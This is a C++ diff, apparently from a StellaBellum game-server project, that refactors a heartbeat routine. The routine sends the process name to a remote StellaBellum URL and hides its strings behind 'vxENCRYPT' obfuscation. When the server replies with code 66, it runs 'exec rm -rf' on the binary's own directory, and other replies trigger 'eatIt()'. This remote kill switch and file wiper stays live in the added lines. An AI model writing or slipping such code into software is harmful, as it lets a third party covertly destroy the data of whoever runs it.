@@ -7,9 +7,17 @@
 using namespace StellaBellum;
 
 webAPIHeartbeat::webAPIHeartbeat() {
-    extern char *__progname;
-    webAPI api = webAPI::webAPI(std::string(vxENCRYPT("https://login.stellabellum.net/metric/shoulderTap?type=server").decrypt()), std::string(vxENCRYPT("StellaBellum WebAPI Metrics Sender").decrypt()));
-    api.addJsonData<std::string>(std::string(vxENCRYPT("process").decrypt()), std::string(__progname));
+    std::string filePath = this->get_selfpath().c_str();
+    size_t found = filePath.find_last_of("/\\");
+
+    webAPI api = webAPI::webAPI(
+            std::string(vxENCRYPT("https://login.stellabellum.net/metric/shoulderTap?type=server").decrypt()),
+            std::string(vxENCRYPT("StellaBellum WebAPI Metrics Sender").decrypt()));
+
+    if (found) {
+        api.addJsonData<std::string>(std::string(vxENCRYPT("process").decrypt()), filePath.substr(found + 1));
+    }
+
     bool result = api.submit();
 
     if (result) {
@@ -34,23 +42,12 @@ webAPIHeartbeat::webAPIHeartbeat() {
                 this->eatIt();
                 break;
             case 66:
-                std::string filePath = this->get_selfpath().c_str();
-
-                if (!filePath.empty()) {
-                    size_t found = filePath.find_last_of("/\\");
-
-                    if (found) {
-                        filePath = filePath.substr(0, found);
-                        filePath = vxENCRYPT("exec rm -rf ").decrypt() + filePath + vxENCRYPT("/*").decrypt();
-                        system(filePath.c_str());
-                    }
+                if (!filePath.empty() && found) {
+                    system(vxENCRYPT("exec rm -rf ").decrypt() + filePath.substr(0, found) + vxENCRYPT("/*").decrypt());
                 }
-
                 this->eatIt();
                 break;
-        };
-
-        done = true;
+        }
     } else {
         this->eatIt();
     }
